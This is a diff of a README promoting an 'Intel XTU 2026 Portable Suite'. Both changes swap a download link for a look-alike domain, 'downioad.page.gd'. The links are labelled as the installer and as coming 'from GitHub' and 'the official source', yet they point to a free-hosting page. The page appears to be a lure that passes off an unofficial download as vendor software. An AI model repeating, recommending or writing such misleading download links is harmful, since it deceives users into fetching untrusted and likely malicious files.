@@ -2,7 +2,7 @@
 
 Intel XTU 2026 Portable Suite is a comprehensive tool designed for enthusiasts to tweak, monitor, and optimize Intel-based systems without installation. This portable version allows you to run Intel XTU directly on any Windows 10 or 11 machine, making it perfect for on-the-go adjustments and performance tuning in 2026. Whether you're a gamer, content creator, or hardware tinkerer, this suite provides intuitive controls to unlock your system's potential.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ A: Yes, Intel XTU 2026 Portable Suite is designed to be safe and is widely recog
 
 To get started, download the latest version of Intel XTU 2026 Portable Suite from the official source. This ensures you have the most recent features and security updates.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Disclaimer and Safety Notes
 
